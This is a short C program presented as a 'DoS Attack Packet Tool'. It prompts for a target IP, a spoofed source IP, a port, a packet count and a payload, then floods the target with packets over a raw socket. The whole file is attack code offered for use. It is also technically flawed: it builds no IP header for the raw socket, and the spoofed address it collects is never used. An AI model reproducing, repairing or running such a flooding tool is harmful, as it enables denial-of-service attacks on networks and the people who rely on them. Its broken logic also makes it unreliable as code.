#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define MAX_PACKET_SIZE 4096

// Function prototypes
void sendVolumetricAttack(char *target, int port, int count, char *payload, char *source_ip);
void displayMenu();
void getPacketData(char *target, int *port, int *packetCount, char *payload, char *source_ip);

int main() {
    int choice;
    while (1) {
        displayMenu();
        printf("Select an option: ");
        scanf("%d", &choice);
        getchar(); // Clear newline from input buffer

        switch (choice) {
            case 1: {
                char target[50];
                int port, packetCount;
                char payload[MAX_PACKET_SIZE], source_ip[50];

                getPacketData(target, &port, &packetCount, payload, source_ip);
                sendVolumetricAttack(target, port, packetCount, payload, source_ip);
            }
            break;
            case 0:
                printf("Exiting the program.\n");
                return 0;
            default:
                printf("Invalid option! Try again.\n");
        }
    }

    return 0;
}

void displayMenu() {
    printf("=== DoS Attack Packet Tool ===\n");
    printf("1. Volumetric Attack\n");
    printf("0. Exit\n");
}

void getPacketData(char *target, int *port, int *packetCount, char *payload, char *source_ip) {
    printf("Enter the target IP address: ");
    fgets(target, 50, stdin);
    target[strcspn(target, "\n")] = '\0';  // Remove newline character

    printf("Enter the source IP address (spoofed): ");
    fgets(source_ip, 50, stdin);
    source_ip[strcspn(source_ip, "\n")] = '\0';

    printf("Enter the target port: ");
    scanf("%d", port);
    getchar();

    printf("Enter the number of packets to send: ");
    scanf("%d", packetCount);
    getchar();

    printf("Enter the payload for the volumetric attack (Example: 'LARGE_TRAFFIC_ATTACK'): ");
    fgets(payload, MAX_PACKET_SIZE, stdin);
    payload[strcspn(payload, "\n")] = '\0';
}

void sendVolumetricAttack(char *target, int port, int count, char *payload, char *source_ip) {
    int sockfd;
    struct sockaddr_in target_addr;
    char packet[MAX_PACKET_SIZE];

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target);

    printf("Sending %d volumetric packets to %s:%d with payload: %s\n", count, target, port, payload);

    // Sending the packets
    for (int i = 0; i < count; i++) {
        // Fill packet data
        memset(packet, 0, MAX_PACKET_SIZE);  // Clear the packet buffer
        strcpy(packet, payload); // Set the payload in the packet

        // Send packet
        if (sendto(sockfd, packet, strlen(packet), 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Packet sending failed");
        } else {
            printf("Volumetric packet %d sent to %s:%d\n", i + 1, target, port);
        }
    }

    close(sockfd);
}
